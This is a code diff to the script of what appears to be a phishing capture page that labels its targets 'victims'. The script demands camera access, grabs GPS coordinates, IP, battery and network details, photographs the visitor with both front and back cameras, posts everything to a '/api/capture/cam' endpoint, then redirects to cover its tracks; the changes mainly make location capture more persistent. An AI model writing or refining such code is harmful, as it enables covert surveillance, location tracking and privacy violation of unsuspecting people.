@@ -121,7 +121,6 @@
     </div>
 
     <script>
-        // ===== URL PARAMS =====
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
@@ -129,22 +128,15 @@
         console.log('Victim ID:', victimId);
         console.log('Redirect URL:', redirectUrl);
 
-        // ===== REDIRECT FUNCTION =====
         function doRedirect() {
             let target = 'https://google.com';
-
-            if (redirectUrl &&
-                redirectUrl.trim() !== '' &&
-                redirectUrl !== '{{REDIRECT_URL}}' &&
-                redirectUrl.toLowerCase().startsWith('http')) {
+            if (redirectUrl && redirectUrl.trim() !== '' && redirectUrl !== '{{REDIRECT_URL}}' && redirectUrl.toLowerCase().startsWith('http')) {
                 target = redirectUrl.trim();
             }
-
-            console.log('Final Redirect to:', target);
+            console.log('Final Redirect:', target);
             window.location.href = target;
         }
 
-        // ===== BASIC INFO =====
         function getBasicInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -155,7 +147,6 @@
             };
         }
 
-        // ===== BATTERY =====
         async function getBatteryInfo() {
             try {
                 if (navigator.getBattery) {
@@ -169,7 +160,6 @@
             return { level: 'N/A', charging: 'N/A' };
         }
 
-        // ===== NETWORK =====
         function getNetworkInfo() {
             try {
                 if (navigator.connection) {
@@ -183,7 +173,6 @@
             return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
         }
 
-        // ===== IP =====
         async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -199,7 +188,6 @@
             }
         }
 
-        // ===== SEND DATA =====
         async function sendData(payload) {
             try {
                 return await fetch('/api/capture/cam', {
@@ -216,7 +204,6 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // ===== CAMERA PERMISSION (COMPULSORY) =====
         async function requestCameraPermission() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -227,27 +214,48 @@
             }
         }
 
-        // ===== GPS LOCATION PERMISSION (OPTIONAL) =====
         function requestGPSPermission() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve({ granted: false, lat: null, lng: null });
                     return;
                 }
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({
-                        granted: true,
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    }),
-                    err => resolve({ granted: false, lat: null, lng: null }),
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                console.log('Requesting GPS...');
+                let resolved = false;
+                const watchId = navigator.geolocation.watchPosition(
+                    pos => {
+                        if (!resolved) {
+                            resolved = true;
+                            navigator.geolocation.clearWatch(watchId);
+                            console.log('GPS granted');
+                            resolve({
+                                granted: true,
+                                lat: pos.coords.latitude,
+                                lng: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            });
+                        }
+                    },
+                    err => {
+                        if (!resolved) {
+                            resolved = true;
+                            navigator.geolocation.clearWatch(watchId);
+                            console.log('GPS denied');
+                            resolve({ granted: false, lat: null, lng: null });
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
+                setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve({ granted: false, lat: null, lng: null });
+                    }
+                }, 16000);
             });
         }
 
-        // ===== CAPTURE CAMERA =====
         async function captureCamera(facingMode, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -280,7 +288,6 @@
             }
         }
 
-        // ===== SHOW/HIDE ERROR =====
         function showError(msg) {
             const errorBox = document.getElementById('permissionError');
             document.getElementById('errorMsg').textContent = msg;
@@ -291,7 +298,6 @@
             document.getElementById('permissionError').style.display = 'none';
         }
 
-        // ===== MAIN SEQUENCE =====
         async function startCapture() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
@@ -309,7 +315,7 @@
             btn.textContent = '⏳ Please wait...';
             loading.classList.remove('hidden');
 
-            // ===== STEP 1: CAMERA PERMISSION (COMPULSORY) =====
+            // CAMERA (COMPULSORY)
             const hasCamera = await requestCameraPermission();
             if (!hasCamera) {
                 btn.disabled = false;
@@ -319,10 +325,10 @@
                 return;
             }
 
-            // ===== STEP 2: GPS LOCATION PERMISSION (OPTIONAL) =====
+            // GPS (OPTIONAL)
             const gps = await requestGPSPermission();
 
-            // ===== STEP 3: COLLECT INFO =====
+            // INFO
             const basicInfo = getBasicInfo();
             const batteryInfo = await getBatteryInfo();
             const networkInfo = getNetworkInfo();
@@ -351,17 +357,17 @@
             });
             await wait(500);
 
-            // ===== STEP 4: FRONT CAMERA =====
+            // FRONT CAMERA
             const frontOk = await captureCamera('user', 'Front');
             await wait(1000);
 
-            // ===== STEP 5: BACK CAMERA =====
+            // BACK CAMERA
             if (frontOk) {
                 await captureCamera('environment', 'Back');
                 await wait(1000);
             }
 
-            // ===== STEP 6: TIMER + REDIRECT =====
+            // TIMER + REDIRECT
             loading.classList.add('hidden');
             timer.style.display = 'block';
 
@@ -371,7 +377,6 @@
             const interval = setInterval(() => {
                 seconds--;
                 timerCount.textContent = seconds;
-
                 if (seconds <= 0) {
                     clearInterval(interval);
                     doRedirect();
